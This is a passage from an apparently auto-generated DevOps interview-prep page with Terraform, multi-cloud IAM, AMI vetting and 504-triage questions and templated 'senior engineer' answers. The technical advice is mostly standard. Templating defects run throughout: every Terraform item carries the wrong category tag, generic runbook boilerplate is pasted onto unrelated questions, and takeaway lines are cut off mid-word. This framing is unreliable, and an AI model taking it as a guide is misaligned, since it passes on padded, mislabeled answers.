"When terraform plan shows unexpected changes, my golden rule is: never apply blindly. Investigate the diff first. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

`terraform_remote_state` lets one Terraform module read outputs from another module's state file.

- **Tight coupling** — if the VPC module's output changes, the consuming module breaks.
- **State access permissions** — any module can read any state file it has S3 access to.
- **State contains sensitive data** — reading another state file may expose passwords, keys.

##### 2️⃣ Remediation & Permanent Safeguards

**Risks:** **Alternative**: Use AWS SSM Parameter Store or Secrets Manager to share values between Terraform modules. Less coupling, better access control. ---

```hcl
data "terraform_remote_state" "vpc" {
  backend = "s3"
  config = {
    bucket = "my-tfstate"
    key    = "vpc/terraform.tfstate"
    region = "us-east-1"
  }
}

# Use VPC ID from another module
subnet_id = data.terraform_remote_state.vpc.outputs.private_subnet_id
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Tight coupling — if the VPC module's output changes, the consuming module breaks..

#### ⏱️ 60-Second Elevator Pitch Summary

- Tight coupling — if the VPC module's output changes, the consuming module breaks.
- State access permissions — any module can read any state file it has S3 access to.
- State contains sensitive data — reading another state file may expose passwords, keys.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-193-terraform-q25-how-do-you-manage-terraform-provider-credentials-without-hardcoding-them-l3"></a>
### 193. Terraform Q25: How do you manage Terraform provider credentials without hardcoding them [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you manage Terraform provider credentials without hardcoding them?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Never put credentials in Terraform files. Use environment variables (`AWS_ACCESS_KEY_ID`), IAM instance profiles (on EC2/ECS), OIDC for CI/CD, or AWS profiles. The provider picks up credentials from the standard AWS credential chain.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Never put credentials in Terraform files. Use environment variables (AWS_ACCESS_KEY_ID), IAM instance profiles (on EC2/ECS), OIDC .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Never put credentials in Terraform files. Use environment variables (AWS_ACCESS_KEY_ID), IAM in
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-194-terraform-q27-how-do-you-make-terraform-wait-for-one-resource-before-creating-another-l2"></a>
### 194. Terraform Q27: How do you make Terraform wait for one resource before creating another [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Use VPC ID from another module` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you make Terraform wait for one resource before creating another?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our enterprise Terraform repository, we designed reusable modules and remote backends to prevent this exact issue. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use `depends_on`. Terraform infers dependencies from references automatically. Use explicit `depends_on` only when the dependency isn't captured by a reference (e.g., IAM policy propagation time).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use depends_on. Terraform infers dependencies from references automatically. Use explicit depends_on only when the dependency isn'.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use depends_on. Terraform infers dependencies from references automatically. Use explicit depen
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-195-terraform-q34-you-want-to-create-an-s3-bucket-name-based-on-the-account-id-to-ensure-uniqueness-how-l2"></a>
### 195. Terraform Q34: You want to create an S3 bucket name based on the account ID to ensure uniqueness How [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Use VPC ID from another module` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"You want to create an S3 bucket name based on the account ID to ensure uniqueness. How?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When terraform plan shows unexpected changes, my golden rule is: never apply blindly. Investigate the diff first. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use `data "aws_caller_identity" "current" {}` → `bucket = "my-app-${data.aws_caller_identity.current.account_id}"`.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use data "aws_caller_identity" "current" {} → bucket = "my-app-${data.aws_caller_identity.current.account_id}"..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use data "aws_caller_identity" "current" {} → bucket = "my-app-${data.aws_caller_identity.curre
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-196-terraform-q41-how-do-you-implement-zero-downtime-terraform-changes-for-an-alb-l3"></a>
### 196. Terraform Q41: How do you implement zero-downtime Terraform changes for an ALB [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you implement zero-downtime Terraform changes for an ALB?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

For listener rule changes: create new rule before deleting old. `create_before_destroy`. For target group changes: add new TG to ALB, shift traffic, remove old TG. Use weighted routing to gradually shift.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: For listener rule changes: create new rule before deleting old. create_before_destroy. For target group changes: add new TG to ALB.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: For listener rule changes: create new rule before deleting old. create_before_destroy. For targ
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-197-terraform-q43-how-do-you-prevent-accidental-destruction-of-production-resources-in-terraform-l3"></a>
### 197. Terraform Q43: How do you prevent accidental destruction of production resources in Terraform [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you prevent accidental destruction of production resources in Terraform?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our enterprise Terraform repository, we designed reusable modules and remote backends to prevent this exact issue. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Multiple layers: `lifecycle { prevent_destroy = true }` on critical resources. Pipeline policy that fails if plan contains destroys. AWS Config rules that alert on resource deletion. S3 MFA Delete for the state bucket itself.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Multiple layers: lifecycle { prevent_destroy = true } on critical resources. Pipeline policy that fails if plan contains destroys..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Multiple layers: lifecycle { prevent_destroy = true } on critical resources. Pipeline policy th
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-198-terraform-q45-how-do-you-handle-a-situation-where-terraform-needs-to-create-resources-in-a-specific-order-eg-wait-30-seconds-for-iam-propagation-l3"></a>
### 198. Terraform Q45: How do you handle a situation where Terraform needs to create resources in a specific order (eg wait 30 seconds for IAM propagation) [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you handle a situation where Terraform needs to create resources in a specific order (e.g., wait 30 seconds for IAM propagation)?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use `time_sleep` resource from the `hashicorp/time` provider:

```hcl
resource "time_sleep" "wait_30_seconds" {
  depends_on      = [aws_iam_role.example]
  create_duration = "30s"
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use time_sleep resource from the hashicorp/time provider:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use time_sleep resource from the hashicorp/time provider:
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-199-terraform-q48-what-is-the-open-policy-agent-opa-integration-with-terraform-l3"></a>
### 199. Terraform Q48: What is the Open Policy Agent (OPA) integration with Terraform [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"What is the Open Policy Agent (OPA) integration with Terraform?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Treat Terraform code with the same rigor as application code: pre-merge plans, state locks, and automated drift detection. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

OPA evaluates Terraform plan JSON against Rego policies. Example: deny any plan that creates a publicly accessible S3 bucket. Used in CI to enforce organizational policies before `apply`. Terraform Cloud has OPA policy sets built-in.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: OPA evaluates Terraform plan JSON against Rego policies. Example: deny any plan that creates a publicly accessible S3 bucket. Used.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: OPA evaluates Terraform plan JSON against Rego policies. Example: deny any plan that creates a
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-200-terraform-q54-what-is-the-replace-triggered-by-lifecycle-argument-l2"></a>
### 200. Terraform Q54: What is the replace_triggered_by lifecycle argument [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Use VPC ID from another module` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"What is the `replace_triggered_by` lifecycle argument?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When terraform plan shows unexpected changes, my golden rule is: never apply blindly. Investigate the diff first. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Forces resource replacement when another resource changes. Example: replace EC2 instance whenever the launch template changes:

```bash
lifecycle {
  replace_triggered_by = [aws_launch_template.app]
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Forces resource replacement when another resource changes. Example: replace EC2 instance whenever the launch template changes:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Forces resource replacement when another resource changes. Example: replace EC2 instance whenev
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-201-terraform-q59-how-do-you-use-terraform-to-create-iam-policies-without-hardcoding-json-l2"></a>
### 201. Terraform Q59: How do you use Terraform to create IAM policies without hardcoding JSON [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Use VPC ID from another module` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"How do you use Terraform to create IAM policies without hardcoding JSON?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our enterprise Terraform repository, we designed reusable modules and remote backends to prevent this exact issue. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use the `aws_iam_policy_document` data source: Clean HCL instead of embedded JSON strings. Properly interpolates ARNs.

```bash
data "aws_iam_policy_document" "s3_read" {
  statement {
    effect    = "Allow"
    actions   = ["s3:GetObject"]
    resources = ["${aws_s3_bucket.data.arn}/*"]
  }
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use the aws_iam_policy_document data source:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use the aws_iam_policy_document data source:
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-202-terraform-q65-your-s3-backend-bucket-for-terraform-state-was-deleted-by-mistake-but-the-infrastructure-still-exists-what-is-your-recovery-path-l2"></a>
### 202. Terraform Q65: Your S3 backend bucket for Terraform state was deleted by mistake but the infrastructure still exists What is your recovery path [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Production Scenario [L2]`

**Tags:** `Terraform` `Use VPC ID from another module` `L2` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"Your S3 backend bucket for Terraform state was deleted by mistake but the infrastructure still exists. What is your recovery path?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

First recreate the backend bucket and locking table if needed. Restore the latest valid state from S3 versioning or backup; if no backup exists, create a fresh backend and rebuild state by importing resources with `terraform import`. After recovery, enable versioning, restrict delete permissions, and document the backend as critical infrastructure so it is protected like production data.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: First recreate the backend bucket and locking table if needed. Restore the latest valid state from S3 versioning or backup; if no .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: First recreate the backend bucket and locking table if needed. Restore the latest valid state f
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-203-terraform-q71-a-terraform-destroy-in-a-non-prod-environment-is-taking-too-long-because-some-resources-have-deletion-protection-or-dependent-objects-how-do-you-debug-it-l3"></a>
### 203. Terraform Q71: A terraform destroy in a non-prod environment is taking too long because some resources have deletion protection or dependent objects How do you debug it [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"A `terraform destroy` in a non-prod environment is taking too long because some resources have deletion protection or dependent objects. How do you debug it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our enterprise Terraform repository, we designed reusable modules and remote backends to prevent this exact issue. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Start with the plan and identify the resource where deletion blocks. Common causes are S3 buckets that still contain objects, security groups attached to ENIs, load balancer target groups still in use, or managed databases with deletion protection enabled. Fix the blocking dependency first, then rerun destroy. For recurring issues, encode cleanup behavior in Terraform so teardown is predictable.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Start with the plan and identify the resource where deletion blocks. Common causes are S3 buckets that still contain objects, secu.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Start with the plan and identify the resource where deletion blocks. Common causes are S3 bucke
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-204-terraform-q77-you-want-to-enforce-that-no-one-can-create-public-s3-buckets-even-if-they-bypass-terraform-and-use-the-console-is-terraform-alone-enough-l3"></a>
### 204. Terraform Q77: You want to enforce that no one can create public S3 buckets even if they bypass Terraform and use the console Is Terraform alone enough [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Terraform` • `Use VPC ID from another module` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Terraform` `Use VPC ID from another module` `L3` `IaC` `Cloud Infrastructure`

> **Interview Question:**  
> *"You want to enforce that no one can create public S3 buckets even if they bypass Terraform and use the console. Is Terraform alone enough?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Managing infrastructure as code across multiple teams requires disciplined state management and locking. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

No. Terraform can express the desired configuration and detect drift, but it cannot stop out-of-band changes by itself. Pair Terraform with preventive controls such as AWS Organizations SCPs, IAM policies, and security guardrails. Terraform handles provisioning; platform policy enforces what is allowed.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: No. Terraform can express the desired configuration and detect drift, but it cannot stop out-of-band changes by itself. Pair Terra.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: No. Terraform can express the desired configuration and detect drift, but it cannot stop out-of
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-205-multi-cloud-production-architecture-cross-cloud-routing-workload-iam-secret-syncing"></a>
### 205. Multi-Cloud Production Architecture: Cross-Cloud Routing, Workload IAM & Secret Syncing

**Level:** `Staff / Principal SRE` | **Category:** `AWS` • `Cloud Architecture & Multi-Cloud` | **Type:** `Netflix-Scale Systems`

**Tags:** `Multi-Cloud` `AWS` `GCP` `BGP` `Workload Identity`

> **Interview Question:**  
> *"Netflix runs multi-cloud. Describe your approach to cross-cloud routing, IAM, and secret syncing."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
True enterprise multi-cloud is not about running the exact same Kubernetes YAML everywhere. It is about building a unified abstraction across three foundational pillars: low-latency private network routing without public internet traversal, cryptographic workload identity federation without static API keys, and centralized secret lifecycle reconciliation.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Private Cross-Cloud Routing (AWS Direct Connect + GCP Cloud Interconnect)

Never route internal multi-cloud traffic over the public internet with IPsec tunnels due to MTU fragmentation and jitter:

- **Colocation Interconnect Fabric:** Utilize Equinix Fabric or Megaport to cross-connect AWS Direct Connect (DX) and GCP Dedicated Interconnect with redundant 10Gbps cross-connects.
- **BGP Routing over Transit Gateway:** Establish eBGP sessions between AWS Transit Gateway (TGW) and GCP Cloud Router with non-overlapping RFC 1918 CIDRs (e.g., AWS `10.100.0.0/16`, GCP `10.200.0.0/16`).
- **Bidirectional Forwarding Detection (BFD):** Configure BFD with 300ms transmit/receive intervals to detect link failures and trigger sub-second route convergence.

##### 2️⃣ Zero-Static-Key IAM Federation (SPIFFE/SPIRE & Workload Identity)

Eliminate long-lived cloud credentials across providers using OIDC Workload Identity Federation:

- A workload running on Google Cloud GKE acquires an ephemeral short-lived Google OIDC token, exchanges it at AWS STS for temporary IAM credentials, and accesses Amazon S3 without a single hardcoded secret.

```bash
# AWS Trust Policy allowing GCP Service Account to assume AWS IAM Role:
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "accounts.google.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "accounts.google.com:aud": "https://iam.googleapis.com/projects/12345/locations/global/workloadIdentityPools/gcp-pool/providers/gcp-provider"
      }
    }
  }]
}
```

##### 3️⃣ Centralized Secret Syncing Engine (HashiCorp Vault + External Secrets Operator)

Treat secrets as a single control plane replicated securely across clouds:

- **Vault Primary-Replica Cluster:** Multi-region Vault cluster with KMS auto-unseal (AWS KMS in us-east-1, GCP Cloud KMS in us-central1).
- **Kubernetes External Secrets Operator (ESO):** Deployed in both AWS EKS and GCP GKE clusters, fetching credentials locally from Vault and instantiating native Kubernetes `v1/Secret` objects.
- **Automated Rotation:** Database credentials (RDS and Cloud SQL) are dynamically generated with 1-hour TTLs via Vault database secrets engines.

#### 🎯 Key Architectural Takeaway
> Multi-cloud operational resilience requires eliminating static trust: private layer-3 BGP fabrics replace public tunnels, OIDC workload identity replaces static API keys, and declarative secret operators replace manual syncing.

#### ⏱️ 60-Second Elevator Pitch Summary

- We build a private layer-3 backbone using AWS Direct Connect and GCP Cloud Interconnect over an Equinix Cloud Exchange fabric with redundant eBGP sessions and BFD for sub-second failover.
- For IAM, we forbid static IAM access keys. We deploy SPIFFE/SPIRE and OIDC Workload Identity Federation so workloads exchange cryptographic JWTs across clouds to assume native temporary IAM roles.
- For secrets, we maintain a federated HashiCorp Vault cluster with cloud-native KMS auto-unseal, synced via External Secrets Operator into local Kubernetes clusters.
- All operational credentials feature automated rotation with 1-hour dynamic TTLs to minimize credential blast radius.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-206-custom-enterprise-ami-pre-production-vetting-strategy-kernel-tuning-runtime-validation"></a>
### 206. Custom Enterprise AMI Pre-Production Vetting Strategy: Kernel Tuning & Runtime Validation

**Level:** `Staff / Principal SRE` | **Category:** `Linux` • `Linux Systems & Cloud Compute` | **Type:** `Netflix-Scale Systems`

**Tags:** `Linux` `Kernel` `AMI` `AWS` `Packer`

> **Interview Question:**  
> *"Your app teams demand custom AMIs. What’s your pre-prod vetting strategy at kernel and runtime?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
When development teams demand bespoke AMIs with specific glibc versions, specialized CUDA drivers, or custom kernel patches, allowing unvetted images into production invites catastrophic kernel panics, noisy-neighbor IOPS starvation, and unpatched CVEs. We established an automated 'Golden AMI Verification Pipeline' that enforces rigorous kernel profiling, hardware conformance, and chaos testing before any AMI is promoted to our organization's AWS Service Catalog.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Image Construction & Security Compliance Gate

Every AMI is built strictly via code using HashiCorp Packer and Ansible with zero manual SSH access:

- **CIS Level 2 Hardening:** Automated audit using Chef InSpec validating file permissions, disabled legacy filesystems (cramfs, squashfs), and auditd rules.
- **Vulnerability Scanning:** Rapid CVE scan with Trivy / AWS Inspector. AMIs with unpatched Critical or High CVEs fail the build immediately.
- **Kernel Driver Verification:** Confirms Amazon ENA (Elastic Network Adapter) driver version and NVMe storage driver patches are up to date.

##### 2️⃣ Kernel Parameter & Memory Allocator Profiling

Pre-configure and validate critical kernel sysctl boundaries for high-throughput cloud workloads:

- **Transparent Hugepages (THP):** Disabled (`madvise` or `never`) for database and caching workloads to avoid allocation stalls.
- **cgroup v2 Enforcement:** Verifies modern systemd unified cgroup hierarchy (`systemd.unified_cgroup_hierarchy=1`) for granular memory pressure tracking.

```bash
# /etc/sysctl.d/99-production-scale.conf
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 65535
net.ipv4.tcp_fin_timeout = 15
net.ipv4.tcp_tw_reuse = 1
vm.max_map_count = 262144
vm.overcommit_memory = 1
vm.dirty_ratio = 10
vm.dirty_background_ratio = 5
```

##### 3️⃣ Synthetic Stress Testing & Cold-Start Benchmark Gate

Before promotion, an ephemeral EC2 instance is spun up to execute a 45-minute battery of automated stress tests:

```bash
# 1. Stress CPU, memory, and kernel lock contention
stress-ng --cpu 0 --vm 4 --vm-bytes 80% --timeout 15m --metrics

# 2. Benchmark NVMe I/O queue depth and latency under load
fio --name=randwrite --ioengine=libaio --iodepth=64 --rw=randwrite --bs=4k --direct=1 --size=2G

# 3. Test clean kernel reboot & crash dump generation
sudo kexec -e
```

> 💡 **Pro-Tip / Highlight:** If an AMI experiences a kernel panic or fails to initialize cloud-init within 45 seconds, the automated pipeline rejects the candidate AMI.

#### 🎯 Key Architectural Takeaway
> Treat machine images like compiled software binaries: automate their build with Packer, enforce CIS compliance with InSpec, and validate kernel memory allocation under heavy stress before giving teams production access.

#### ⏱️ 60-Second Elevator Pitch Summary

- We prohibit manually crafted AMIs. All images are built declaratively via Packer and Ansible in an isolated CI/CD runner.
- The pre-prod vetting runs through three automated stages: Security Compliance (CIS Level 2 benchmarks, Inspector CVE scans), Kernel & Driver Hardening (ENA/NVMe drivers, sysctl tuning, cgroup v2), and Synthetic Burn-In.
- The burn-in phase spins up test instances on targeted EC2 types and runs stress-ng (CPU/memory exhaustion) and fio (I/O latency) for 45 minutes while checking for kernel lockups via dmesg.
- Only AMIs that pass cold-boot latency checks, crash dump validation, and security compliance are tagged and shared across organizational AWS accounts.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-207-playback-stream-504-timeouts-cloud-lb-healthy-mesh-sidecars-passing-video-failing-triage"></a>
### 207. Playback Stream 504 Timeouts: Cloud LB Healthy, Mesh Sidecars Passing, Video Failing Triage

**Level:** `Staff SRE / Principal Architect` | **Category:** `Observability` • `High-Throughput Streaming & SRE` | **Type:** `Netflix-Scale Systems`

**Tags:** `AWS` `ALB` `Envoy` `Streaming` `504 Gateway Timeout`

> **Interview Question:**  
> *"504 errors on the playback service. Cloud LB shows healthy, mesh sidecars pass, but users can’t stream. Triage."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
During the premiere of a major title, users flood customer support: video streams freeze and return HTTP 504 Gateway Timeouts. The Cloud Load Balancer (ALB) dashboard reports 100% healthy backend target instances, and internal Kubernetes Istio/Envoy sidecars report normal HTTP 200 health check responses. Yet, video playback requests fail. We must trace the end-to-end request flow to expose why health checks deceive the load balancer.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ The Root Illusion: Health Check vs Video Stream Decoupling

Understand why health check metrics diverge completely from user traffic:

- ALB target health checks query a lightweight endpoint (e.g. `GET /healthz`) which returns in 2ms from memory.
